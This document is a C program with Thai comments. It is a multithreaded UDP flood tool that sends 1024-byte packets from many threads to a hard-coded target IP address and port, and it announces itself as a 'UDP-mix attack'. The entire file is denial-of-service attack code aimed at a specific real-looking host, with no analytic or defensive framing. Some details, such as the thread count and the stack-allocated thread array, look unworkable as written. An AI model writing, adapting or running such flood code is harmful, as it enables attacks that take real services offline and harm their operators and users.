#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PACKET_SIZE 1024
#define TARGET_PORT 10012  // พอร์ตเป้าหมาย
#define TARGET_IP "202.181.72.70"  // IP เป้าหมาย
#define NUM_THREADS 300000  // จำนวนเธรด
#define TOTAL_PACKETS 800000  // จำนวนแพ็กเกจทั้งหมด
#define PACKETS_PER_THREAD (TOTAL_PACKETS / NUM_THREADS)  // แพ็กเกจที่แต่ละเธรดจะส่ง

// โครงสร้างที่ใช้ส่งแพ็กเกจ
typedef struct {
    int sockfd;
    struct sockaddr_in target_addr;
} thread_data_t;

// ฟังก์ชันที่ใช้ส่งแพ็กเกจ UDP
void *send_udp_packet(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    char packet[PACKET_SIZE];
    memset(packet, 'X', PACKET_SIZE);  // กำหนดค่าข้อมูลในแพ็กเกจ

    for (int i = 0; i < PACKETS_PER_THREAD; i++) {
        if (sendto(data->sockfd, packet, PACKET_SIZE, 0, (struct sockaddr *)&data->target_addr, sizeof(data->target_addr)) == -1) {
            perror("sendto failed");
            exit(1);
        }
    }

    return NULL;
}

int main() {
    int sockfd;
    struct sockaddr_in target_addr;
    pthread_t threads[NUM_THREADS];

    // สร้าง socket UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(1);
    }

    // กำหนดค่า target address (IP และ Port)
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);

    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        perror("invalid address or address not supported");
        exit(1);
    }

    printf("Starting UDP-mix attack on %s:%d...\n", TARGET_IP, TARGET_PORT);

    // สร้างเธรดทั้งหมด
    for (int i = 0; i < NUM_THREADS; i++) {
        thread_data_t *data = (thread_data_t *)malloc(sizeof(thread_data_t));
        if (data == NULL) {
            perror("malloc failed");
            exit(1);
        }
        data->sockfd = sockfd;
        data->target_addr = target_addr;

        if (pthread_create(&threads[i], NULL, send_udp_packet, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);  // ปล่อยหน่วยความจำก่อนออกจากโปรแกรม
            exit(1);
        }
    }

    // รอให้ทุกเธรดทำงานเสร็จ
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    // ปิด socket
    close(sockfd);

    printf("Finished sending 800,000 packets.\n");
    return 0;
}
